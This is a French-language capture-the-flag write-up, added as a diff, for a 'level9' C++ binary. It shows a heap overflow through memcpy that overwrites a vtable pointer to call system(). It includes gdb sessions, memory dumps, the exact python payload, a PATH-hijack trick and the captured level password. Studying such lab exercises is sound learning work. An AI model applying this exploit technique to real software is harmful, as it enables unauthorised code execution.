@@ -1,0 +1,66 @@
+Le programme attend 1 argument.
+il crée 2 instance de N(int) avec new, appelle instance1.setAnnotation, puis la surcharge operator+ avec l'instance2.
+La fonction membre N::setAnnotation(char*) utilise un memcpy.
+On va donc pouvoir override des choses.
+
+L'adresse de la 1ere instance est 0x804a008, 0x804a078 pour la 2eme.
+L'adresse de destination de memcpy est 0x0804a00c:
+	$ ltrace ./level9 1
+	[...]
+	memcpy(0x0804a00c, "1", 1)                                                                      = 0x0804a00c
+	_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                         = 0xb7fce4a0
+	+++ exited (status 11) +++
+
+0x804a078 - 0x0804a00c = 108
+On va override l'adresse de la vtable de la 2eme instance apres 108char,
+on l'override par l'adresse du buffer de la 1ere instance (0x804a00c), où on va indiquer l'adresse de system() 0xb7d86060
+Test avec gdb:
+	(gdb) r `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08"'`
+		Starting program: /home/user/level9/level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "/bin/sh"'`
+		[...]
+		Breakpoint 4, 0x08048693 in main ()
+	(gdb) x/128x 0x804a000
+		; debut de l'instance 1 (memory chunck compris)
+		0x804a000:      0x00    0x00    0x00    0x00    0x71    0x00    0x00    0x00
+		0x804a008:      0x48    0x88    0x04    0x08    0x60    0x60    0xd8    0xb7  ; <--- adresse de system()
+		;0x804a008 + 4 = 0x804a00c debut de memcpy dest ^^^^
+		0x804a010:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a018:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a020:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a028:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a030:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a038:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a040:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a048:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a050:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a058:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a060:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a068:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		; debut de l'instance 2 (memory chunck compris)
+		0x804a070:      0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+		0x804a078:      0x0c    0xa0    0x04    0x08    0x2f    0x62    0x69    0x6e
+		; override this ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ (vptr de la vtable)
+		; redirect dans notre buffer où on a mis l'adresse de system() 0xb7d86060
+	(gdb) stepi
+		0xb7d86060 in system () from /lib/i386-linux-gnu/libc.so.6
+	(gdb) c
+		Continuing.
+		sh: 1:
+		/bin/sh: not found
+		[Inferior 1 (process 3580) exited normally]
+
+System a bien été appelé mais a fail. Il y a un retour a la ligne dans le rapport d'error: probablement des char pas printables.
+On check sans gdb et on cat -e:
+	$ ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + "/bin/sh"'` 2>&1 | cat -e
+	sh: 1: ^LM- ^D^H/bin/sh: Permission denied$
+
+C'est en fait l'adresse \x0c\xa0\x04\x08. On va donc creer un programme avec ce nom (voir le code source dans Ressources/source.c):
+	$ cd /tmp
+	$ vi source.c
+	$ gcc source.c -o "`python -c 'print "\x0c\xa0\x04\x08"'`"
+	$ cd
+
+On retest (sans "/bin/sh" à la fin pour que le nom match avec notre programme):
+	$ env PATH=/tmp:$PATH ./level9 `python -c 'print "\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08"'`
+	bonus0
+	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
